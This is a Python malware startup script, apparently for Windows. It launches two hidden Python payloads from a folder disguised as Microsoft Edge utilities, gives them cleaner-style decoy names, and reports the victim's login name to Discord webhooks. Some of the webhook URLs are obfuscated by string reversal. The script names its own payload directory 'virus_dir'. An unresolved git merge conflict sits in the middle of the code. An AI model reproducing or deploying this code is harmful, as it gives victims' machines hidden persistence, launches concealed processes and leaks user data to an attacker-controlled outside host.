import subprocess, sys, os, requests

def log_to_discord(msg:str, important=False):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
<<<<<<< HEAD
        requests.post("pFn5WCsdVgu7jFZ-JheQbUp9gmCoXnHF16M_KCUnhID9iJFIX8rvBzTTO138Xs2O_IFG/8489768775628878841/skoohbew/ipa/moc.drocsid//:sptth"[::-1], json = data)
=======
        requests.post("https://discord.com/api/webhooks/1449725485545164800/TcHX1Py0r0jXoCR3tuBiDlWHFsfq8pj4EiL9-1NdIGBU--gtRGfqc08b6lbtejKd9T8O", json = data)
>>>>>>> 39b2ef9ed18f4314d197caff874110fc53bccffc
        if important:
            requests.post("SAoccbl0BVNMH_6g2CRwtHpXr8UhhpY3F06anpGpuIoQQm0pbmbigqqawfftAoT7uu6B/8874249185068878841/skoohbew/ipa/moc.drocsid//:sptth"[::-1], json = data)
    except:
        print("Failed to send port request")


home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']

virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)

subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleaner_x32.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is file_checker.py
subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleanup_x64.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is gama_aaa.py
log_to_discord("*Started startup file*", important=True)